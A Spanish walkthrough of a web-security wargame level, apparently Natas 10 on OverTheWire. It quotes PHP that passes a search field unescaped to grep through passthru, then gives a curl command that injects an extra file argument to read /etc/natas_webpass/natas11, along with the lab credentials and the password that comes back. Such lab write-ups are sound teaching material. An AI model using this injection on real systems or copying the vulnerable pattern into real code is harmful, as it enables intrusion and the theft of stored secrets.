Para resolver este nivel debemos tener en cuenta que grep permite analizar diferentes archivos solo con un espacio y el filtro de este nivel no sirve para nada, ya que no bloquea caracteres que lo puedan comprometer lo suficiente

``` php
<form>  
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>  
</form>  
  
  
Output:  
<pre>  
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    
	$key = $_REQUEST["needle"];  
}  
  
if($key != "") {  
    if(preg_match('/[;|&]/',$key)) {  
        print "Input contains an illegal character!";  
    } else {        
	    passthru("grep -i $key dictionary.txt");  
    }  
}  
?>  
</pre>
```
Nos damos cuenta que bloquea ciertos caracteres como lo son el `;` el `|` y el `&`, no llega a bloquear ciertos caracteres como lo son el `/` o el `.`
Para resolver este nivel necesitamos hacer algo muy similar al nivel anterior
``` zsh
curl -s -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -d "needle=. /etc/natas_webpass/natas11&submit=Search" http://natas10.natas.labs.overthewire.org | grep "natas11"
```
y la contraseña nos da
``` zsh
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
